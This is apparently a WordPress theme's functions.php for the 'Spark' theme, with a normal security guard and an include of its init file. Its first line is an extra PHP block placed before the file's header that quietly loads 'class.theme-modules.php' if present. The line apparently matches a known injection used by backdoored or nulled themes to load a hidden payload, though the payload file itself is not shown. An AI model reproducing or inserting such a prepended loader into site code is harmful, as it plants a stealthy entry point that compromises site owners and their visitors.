<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php 
/**
 * Spart Theme functions and definitions
 */


// File Security Check
if ( ! defined( 'ABSPATH' ) ) { 
	exit; 
}

/**
 *
 * Intialize Spark Theme
 *
 */
require trailingslashit( get_template_directory() ) . 'inc/init.php';



